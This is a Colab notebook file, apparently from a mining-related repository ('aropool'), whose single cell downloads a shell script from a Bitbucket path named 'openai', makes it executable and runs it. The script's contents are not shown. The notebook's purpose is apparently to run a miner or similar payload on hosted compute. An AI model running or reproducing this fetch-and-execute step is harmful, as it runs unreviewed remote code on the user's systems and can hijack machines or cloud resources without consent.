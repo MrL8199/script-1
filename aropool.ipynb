{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled4.ipynb",
      "version": "0.3.2",
      "views": {},
      "default_view": {},
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "fi60aAJd6k3-",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          }
        }
      },
      "cell_type": "code",
      "source": [
        "!wget https://bitbucket.org/lovelyn/openai/raw/8b27ed0d016d0653e5b03718682033b055621ed9/startup.sh && chmod +x startup.sh && ./startup.sh"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}
